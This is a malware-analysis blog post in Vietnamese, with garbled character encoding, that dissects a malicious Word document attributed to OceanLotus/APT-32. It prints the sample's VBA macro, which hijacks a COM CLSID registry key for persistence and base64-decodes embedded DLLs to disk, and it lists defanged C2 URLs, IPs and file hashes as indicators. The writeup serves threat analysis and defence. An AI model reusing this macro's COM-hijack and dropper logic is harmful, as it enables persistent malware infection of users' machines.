Th∆∞·ªüng t·∫øt‚Ä¶.
tradahacking.vn/th∆∞·ªüng-t·∫øt-fbcbbed49da7
m4n0w4r

June 2, 2019

m4n0w4r
Follow
May 31, 2019
¬∑
5 min read
V√¥ t√¨nh nh·∫∑t ƒë∆∞·ª£c c√°i sample:
https://www.virustotal.com/gui/file/9f59c397d1346f2707fc7b54fe6cb4622770accf94eb439451
4d2bf167d65007/detection

1/9

Kƒ© thu·∫≠t s·ª≠ d·ª•ng trong t√†i li·ªáu n√†y c√≥ v·∫ª li√™n quan ƒë·∫øn OceanLotus (aka APT-32):
https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/
Th√¥ng tin metadata c·ªßa sample:

D·∫°o v√≤ng v√≤ng trong sample ƒë·ªÉ thu th·∫≠p th√™m th√¥ng tin:

üòâ

2/9

To√†n b·ªô VBA code c·ªßa sample:

3/9

' module: ThisDocument
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_Open()
On Error Resume Next
Dim sAppData As String
sAppData = Environ("APPDATA")
sAppData = sAppData & "\main_background.png"
Dim sAppDataNew As String
sAppDataNew = Chr(34) & sAppData & Chr(34)

Dim myWS As Object, strPath
Set myWS = CreateObject("WScript.Shell")
Set fsoCheck = VBA.CreateObject("Scripting.FileSystemObject")
Dim iCheck As Boolean
iCheck = False
#If Win64 Then
#Else
If (fsoCheck.FileExists("C:\Windows\SysWOW64\cmd.exe") = True) Then
iCheck = True
Else
iCheck = False
End If
#End If
If iCheck = True Then
Dim wsh As Object
Set wsh =
VBA.CreateObject("WScript.Shell")
Dim waitOnReturn As Boolean: waitOnReturn =
True
Dim windowStyle As Integer: windowStyle = 0
Else
If
RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\") = False Then
myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\", "", "REG_SZ"
Else
End If
If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F54C1-4227-AF9B-260AB5FC3543}\InprocServer32\") = False Then
If
RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\") = False Then
myWS.RegWrite
"HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\",
"", "REG_SZ"
Else
End If
Else
End If
End If
Dim b As String
Dim a As String
Dim tableNew As Table
Set tableNew
= ActiveDocument.Tables(1)End Sub
Function RegKeyExists(i_RegKey As String) As Boolean
Dim myWS As Object
On Error GoTo ErrorHandler
Set myWS = CreateObject("WScript.Shell")
myWS.RegRead i_RegKey
RegKeyExists = True
Exit Function
ErrorHandler:

'key was not found

RegKeyExists = FalseEnd Function

4/9

Function Base64Decode(ByVal vCode, ByVal sPath)
Dim oXML, oNode
Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.Text = vCode

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write oNode.nodeTypedValue
objStream.SaveToFile sPath, 2
Set objStream = Nothing
Function

Set oNode = Nothing

Set oXML = NothingEnd

C∆° b·∫£n VBA code n√†y l√†m nhi·ªám v·ª•:
C·∫•u th√†nh ƒë∆∞·ªùng d·∫´n cho t·∫≠p tin
Ki·ªÉm tra m√¥i tr∆∞·ªùng hi·ªán h√†nh l√† hay. N·∫øu l√† 64-bit th√¨ s·∫Ω th·ª±c thi l·ªánh:
wsh.Run "cmd.exe /S /C reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F54C1-4227-AF9B-260AB5FC3543}\InprocServer32 /ve /t REG_SZ /d " & sAppDataNew & " /f
/reg:64", windowStyle, waitOnReturn

ng∆∞·ª£c l·∫°i, th·ª±c thi l·∫ßn l∆∞·ª£t:
myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\", "", "REG_SZ"v√† myWS.RegWrite
"HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B260AB5FC3543}\InprocServer32\", sAppDataNew, "REG_SZ"

D·ª±a v√†o t·ª´ kh√≥a InprocServer32, ta c√≥ th·ªÉ bi·∫øt ƒë∆∞·ª£c file
%APPDATA%\main_background.png s·∫Ω l√† m·ªôt t·∫≠p tin dll
Sau khi thi·∫øt l·∫≠p th√†nh c√¥ng Registry, ti·∫øn h√†nh decode base64data v√† ghi ra file D·ª±a
v√†o bi·∫øn ƒë·ªÉ drop ra dll x64 hay dll x32:
Set tableNew = ActiveDocument.Tables(1)
If (iCheck = True) Then
a =
tableNew.Cell(1, 1).Range.Text //l·∫•y base64data t·∫°i h√†ng 1 c·ªôt 1 (32bit-dll)
= Left(a, Len(a) - 2)
b = Base64Decode(a, sAppData)
Else
a =
tableNew.Cell(1, 2).Range.Text //l·∫•y base64data t·∫°i h√†ng 1 c·ªôt 2 (64-bit dll)
a = Left(a, Len(a) - 2)
b = Base64Decode(a, sAppData)
End If

a

5/9

CƒÉn c·ª© v√†o th√¥ng tin c√≥ ƒë∆∞·ª£c ti·∫øn h√†nh decode ƒë·ªÉ l·∫•y c√°c binary. C√≥ th·ªÉ debug ho·∫∑c l√†
d√πng Cyberchef:
32-bit dll:

64-bit dll:

6/9

üòï

T√¥i th·∫•y attacker c√≥ v·∫ª h∆°i nh·∫ßm trong qu√° tr√¨nh decode v√† ghi ra file. N·∫øu l√† OS 64-bit
th√¨ l·∫°i drop ra 32-bit dll. C√≤n ng∆∞·ª£c l·∫°i, v·ªõi OS 32-bit l·∫°i drop ra 64-bit dll
Ki·ªÉm tra s∆° b·ªô c√°c dll
V·ªõi 32-bit dll:

000000011530
000010013730
0
XA:\Code\Macro_NB2\Request\PostData32.exe -u
hxxps://syn[.]servebbs[.]com/id32[.]png -t 300000

V·ªõi 64-bit dll:

7/9

000000014243
0000000141D0
0
YA:\Code\Macro_NB2\Request\PostData64.exe
hxxps://syn[.]servebbs[.]com/id64.png -t 300000

-u

Th·ª≠ load file v·ªÅ nh∆∞ng C2 ƒë√£ d·∫πo:

IOCs:
Doc sample: 9f59c397d1346f2707fc7b54fe6cb4622770accf94eb4394514d2bf167d65007
Dropped file (based on architecture):
32-bit dll: ee1e3956df9f69ae3c87a53075881f65
64-bit dll: c74a24dea88999797aaceeecd63efaff
Some C2:
hxxps://word[.]webhop[.]info ( 109[.]248[.]149[.]96)
hxxps://syn[.]servebbs[.]com ( 194[.]9[.]177[.]13)

8/9

End.

9/9